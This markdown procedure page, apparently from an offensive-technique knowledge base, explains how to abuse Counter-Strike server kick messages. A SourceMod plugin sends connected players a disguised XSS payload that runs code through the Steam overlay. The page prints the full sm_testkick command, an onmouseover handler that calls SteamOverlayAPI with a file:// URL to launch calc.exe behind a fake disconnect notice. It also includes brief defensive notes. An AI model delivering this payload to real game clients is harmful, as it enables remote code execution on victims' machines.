---
tags:
  - xss
  - rce
  - plugin
type: procedure
tools:
  - '[[tools/grep]]'
  - '[[tools/SourceMod]]'
  - '[[tools/Metamod]]'
  - '[[tools/CS:GO-Dedicated-Server]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/disconnect-html-test]]'
  - '[[commands/kickid-test]]'
  - '[[commands/sm-kick-test]]'
  - '[[commands/sm-testkick-rce]]'
platforms:
  - Windows
techniques:
  - '[[JavaScript]]'
  - '[[Malicious File]]'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
id: 8645ddeb-5ed9-498e-a5e7-fe5e7595b119
created_at: '2025-12-11T06:10:15.654Z'
updated_at: '2025-12-11T06:10:15.654Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059.007]]'
  - '[[T1204.002]]'
---
# Develop and Test XSS Kick Plugin

## Summary

This procedure develops a SourceMod plugin to deliver an XSS payload via kick, enabling RCE on mouseover.

## Description

The testkick.smx plugin uses an <a> tag with onmouseover to call SteamOverlayAPI, opening local files like calc.exe for RCE.

## Requirements

1. SourceMod development environment
2. Dedicated server
3. Victim client to test

## Defense

Defensive measures and detection strategies:

- Block SteamOverlayAPI file URLs
- Sanitize kick messages

## Objectives

1. Create plugin for payload
2. Test mouseover trigger
3. Achieve RCE

## Instructions

### Step 1: Develop Plugin

**Context**: Compile testkick.smx.

### Step 2: Execute Test Kick

**Context**: Run plugin command.

Execute [[commands/sm-testkick-rce]]:

```bash
sm_testkick <a onmouseover="javascript:SteamOverlayAPI.OpenExternalBrowserURL('file://C:/Windows/System32/calc.exe')">The remote host stopped receiving communications and closed the connection</a>
```

> Launches calc.exe on mouseover.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]
- [[Malicious File]]

### Sub-Techniques



## Commands Used

- [[commands/sm-testkick-rce]]

## Tools Used

- [[tools/SourceMod]]

## Tags

- xss
- rce
- plugin
